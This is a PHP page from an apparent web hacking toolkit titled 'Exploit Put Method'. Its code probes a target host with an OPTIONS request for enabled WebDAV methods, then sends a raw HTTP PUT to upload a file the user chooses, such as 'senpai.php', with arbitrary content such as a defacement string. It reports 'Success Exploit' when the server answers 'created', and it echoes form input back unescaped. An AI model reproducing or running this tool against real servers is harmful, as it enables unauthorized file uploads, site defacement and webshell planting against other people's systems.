<?php include("../../header.php"); ?>
<div class="main-panel">
  <div class="content-wrapper">
    <div class="page-header">
      <h3 class="page-title"> Exploit Put Method </h3>
      <nav aria-label="breadcrumb">
        <ol class="breadcrumb">
          <li class="breadcrumb-item"><a href="#">Exploits</a></li>
          <li class="breadcrumb-item active" aria-current="page">Exploit Put Method</li>
        </ol>
      </nav>
    </div>

          <div class="content">
            <div class="col-md-12 grid-margin stretch-card">
            <div class="card">
            <div class="card-body">

    <h2 class="text-center">Expoit PUT Method</h2>
    <div class="tile">
      <div class="col-md-12">

          <?php
          error_reporting(0);
          function check($host)
          {
              error_reporting(0);
              $fp = @fsockopen($host,80,$errno,$errstr,60);
              if(!$fp)
              {
                  $ret = $errstr($errno)."\n";
              }
              else
              {
                  $out = "OPTIONS / HTTP/1.1\r\n";
                  $out .= "Host: ".$host."\r\n";
                  $out .= "User-Agent: Mozilla/5.0 Firefox/3.6.12\r\n";
                  $out .= "Connection: Close\r\n\r\n";
                  fwrite($fp,$out);
                  while(!feof($fp))
                  {
                      $ret .= fgets($fp,128);
                  }
                  return $ret;
                  fclose($fp);
              }
          }
          function ExpPut($host,$file,$str)
          {
              error_reporting(0);
              $fp = @fsockopen($host,80,$errno,$errstr,60);
              if(!$fp)
              {
                  $ret = $errstr($errno)."\n";
              }
              else
              {
                  $cmd = $str;
                  $out = "PUT /".$file." HTTP/1.1\r\n";
                  $out .= "Host: ".$host."\r\n";
                  $out .= "User-Agent: Mozilla/5.0 Firefox/3.6.12\r\n";
                  $out .= "Content-type: application/x-www-form-urlencoded\r\n";
                  $out .= "Content-length: ".strlen($cmd)."\r\n";
                  $out .= "Connection: Close\r\n\r\n";
                  @fputs($fp,$out);
                  @fputs($fp,$cmd);
                  while(!feof($fp))
                  {
                      $ret .= fgets($fp,3600);
                  }
                  return $ret;
                  fclose($fp);
              }
          }
          if(isset($_POST['check']))
          {
              $str = check($_POST['host']);
              $output = '<p>'.$_POST['host'].'</p><p>Try Use:</p><ol start="1">';
              if(preg_match('/put/',strtolower($str)))
              {
                  $output .= '<li>PUT</li>';
              }
              if(preg_match('/copy/',strtolower($str)))
              {
                  $output .= '<li>COPY</li>';
              }
              if(preg_match('/delete/',strtolower($str)))
              {
                  $output .= '<li>DELETE</li>';
              }
              if(preg_match('/move/',strtolower($str)))
              {
                  $output .= '<li>MOVE</li>';
              }
              $output .= '</ol>';
              $output .= $str;
          } elseif(isset($_POST['put']))
          {
              $put = explode("\r\n\r\n",ExpPut($_POST['host'],$_POST['file'],$_POST['str']));
              if(preg_match('/created/',strtolower($put[0])))
              {
                  $output .= "Success Exploit...\n\n";
              }
              else
              {
                  $output = "Failed Exploit...\n\n";
              }
              $output .= $put[0];
          }
          ?>
          <form method="post" action="" enctype="multipart/form-data">
            <tr>
              <td valign="top">File</td>
              <td valign="top"><input type="text" name="file" class="form-control" placeholder="Example: senpai.php" required value="<?php echo $_POST['file'] ?>" /></td>
            </tr>
            <tr>
              <td valign="top">Text</td>
              <td valign="top"><textarea name="str" rows="4" cols="50" class="form-control" placeholder="<h1>Touch Me Senpai!</h1>" required  ><?php echo $_POST['str'] ?></textarea></td>
            </tr>
            <tr>
              <td valign="top">Host</td>
              <td valign="top"><input type="text" name="host" class="form-control" placeholder="target.com" required  value="<?php echo $_POST['host'] ?>" /></td>
            </tr>
            <tr><br>
                  <td valign="top"></td>
              <!-- <td valign="top"><input type="submit" class="btn btn-outline-primary text-center" name="check" value="Check" /><input type="submit" class="btn btn-outline-primary text-center" name="put" value="Send" /></td> -->
              <!-- <td valign="top"></td> -->
            </tr>
            <div class="text-center">

            <input type="submit" class="btn btn-outline-primary text-center" name="check" value="Check" />
            <input type="submit" class="btn btn-outline-primary text-center" name="put" value="Send" />
          </div>
        </form><br>
          <pre>
          <?php echo $output ?>
          </pre>



              </div>
            </div>
          </div>
    </div>
        </div>
          </div>
          </div>
          </div>
          </div>
          </div>
<?php include("../../footer.php"); ?>
          <!-- partial -->
        </div>
        <!-- main-panel ends -->
      </div>
      <!-- page-body-wrapper ends -->
    </div>
    <!-- container-scroller -->
    <!-- plugins:js -->
    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
    <script src="../../assets/vendors/js/vendor.bundle.base.js"></script>
    <!-- endinject -->
    <!-- Plugin js for this page -->
    <!-- End plugin js for this page -->
    <!-- inject:js -->
    <script src="../../assets/js/off-canvas.js"></script>
    <script src="../../assets/js/hoverable-collapse.js"></script>
    <script src="../../assets/js/misc.js"></script>
    <script src="../../assets/js/settings.js"></script>
    <script src="../../assets/js/todolist.js"></script>
    <!-- endinject -->
  </body>
</html>
